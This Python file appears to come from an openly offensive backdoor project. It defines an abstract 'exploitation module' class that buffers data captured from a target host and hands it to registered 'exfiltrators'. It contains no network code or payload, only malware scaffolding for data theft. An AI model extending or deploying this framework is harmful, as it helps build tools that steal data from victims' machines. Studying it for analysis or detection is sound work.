#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import abc


class ExploitationModule(abc.ABC):
    def __init__(self, start_message: str = ""):
        """
        Interface for the implementation of all exploitation modules.

        Args:
            start_message (str): An initial message that will be sent
                to all exfiltrators by the module upon activation.
                Useful as a signal that the service is working.
        """

        self.exfil_buffer: list[str] = [start_message]
        self._exfiltrators = list()

    def register_exfiltrator(self, exfiltrator) -> None:
        """Register an observer to enable output or exfiltration of
        captured data from the target host."""
        self._exfiltrators.append(exfiltrator)

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        [exfiltrator.update() for exfiltrator in self._exfiltrators]
        self.exfil_buffer.clear()

    @property
    def contents(self) -> str:
        """Get a string representation of the data buffered by the
        module for exfiltration."""
        return "".join(self.exfil_buffer)

    @property
    def has_data(self) -> bool:
        """Returns True if the module has data ready for exfiltration
        and False otherwise."""
        return bool(len(self.exfil_buffer))

    @abc.abstractmethod
    def execute(self, *args, **kwargs):
        ...
